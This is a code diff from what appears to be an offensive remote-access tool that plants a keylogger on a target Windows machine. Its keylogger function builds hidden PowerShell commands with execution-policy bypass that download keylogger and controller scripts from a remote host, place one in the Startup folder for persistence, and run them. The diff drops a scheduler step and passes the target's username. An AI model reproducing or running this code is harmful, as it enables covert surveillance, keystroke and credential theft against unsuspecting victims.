@@ -111,15 +111,12 @@ def remote_command(ipv4,pword,command):
 def keylogger(ipv4,pword,temp_path,startup_path,uname):
     print("[+] Initializing keylogger....")
     keylogger_command  = f"powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
-    scheduler_command  = f"powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/scheduler.ps1 -outfile {temp_path}/QbaHnRAlojyG.ps1\""
     controller_command = f"""powershell.exe -noP -ep bypass -windowstyle hidden -c "iwr -uri {remote_path}/keylogger/controller.cmd -outfile \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\"" """
     execute_keylogger  = f"""powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "C:/Users/{uname}/AppData/Roaming/Microsoft/Windows/'Start Menu'/Programs/Startup/meuqSoQyrCUvhGjpV.cmd" """
     print("[+] keylogger prepared. Ready to download....")
-    print("[+] Initializing keylogger.....")
     # print(keylogger_command,'\n\n',scheduler_command,'\n\n',controller_command,'\n\n')
+    print("[+] Initializing keylogger.....")
     remote_command(ipv4,pword,keylogger_command)
-    print("[+] Initializing scheduler.....")
-    remote_command(ipv4,pword,scheduler_command)
     print("[+] Initializing  controller.....")
     remote_command(ipv4,pword,controller_command)
     print("[*] keylogger installed successfully")
@@ -159,7 +156,7 @@ def cli(arguments):
                 if option == "0":
                     connect(tgt_ipv4,tgt_pword)
                 elif option == "1":
-                    keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
+                    keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd,tgt_uname)
                 elif option == "help":
                     clear()
                     print(banner)
